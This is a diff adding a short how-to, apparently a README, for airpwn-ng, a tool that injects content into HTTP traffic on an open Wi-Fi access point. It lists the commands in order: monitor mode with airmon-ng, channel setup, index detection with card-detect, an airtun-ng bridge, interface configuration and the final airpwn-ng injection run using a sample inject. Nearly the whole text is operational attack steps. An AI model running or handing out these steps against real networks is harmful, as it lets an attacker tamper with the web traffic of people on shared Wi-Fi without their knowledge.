@@ -1,0 +1,32 @@
+Example Steps to get airpwn-ng running for an Open Access Point:
+## Steps to perform this on WEP/WPA/WPA2 will be published later
+
+1. Drop desired NIC to monitor mode
+	- airmon-ng start wlan0
+	-OR
+	- airmon-zc start wlan0
+
+## It should be noted here that -zc will create wlan0mon and -ng will create mon0.  Depending on the svn of your aircrack-ng, -zc might have already replaced -ng.  Either or will work fine, but some people will experience -1 problems when dealing with channels using -ng.
+
+## For purposes of clarity, mon0 will reference the Monitor Mode NIC from here on out.
+
+2. Change monitor mode NIC to the desired channel
+	- iwconfig mon0 <channel>
+
+## To find out what channel a card is currently on, perform: iwlist <NIC> channel | grep Current
+
+3. To find the Index Value for airpwn-ng we must perform an http request while running card-detect
+	- ./card-detect mon0
+		- On another laptop, or the same laptop with a NIC connected to the desired AP, open a browser and view an http website
+		- The Index Value will be displayed on the shell where card-detect is running
+
+4. Now we need to create a bridge that "thinks" it's being managed, we use airtun-ng for this
+	- airtun-ng -a <BSSID of Access Point> mon0 -t 0
+
+5. Once airtun-ng is running and at0 is up, we need to configure it.  Obviously you will have to account for your own subnet values, but here is an example
+	- ifconfig at0 192.168.0.200 netmask 255.255.255.0 up
+
+6. Now it's time to inject our content.
+	- ./airpwn-ng example-injects/wargames mon0 at0 <Index Value>
+
+Okay, that's all.  How about a nice game of chess?
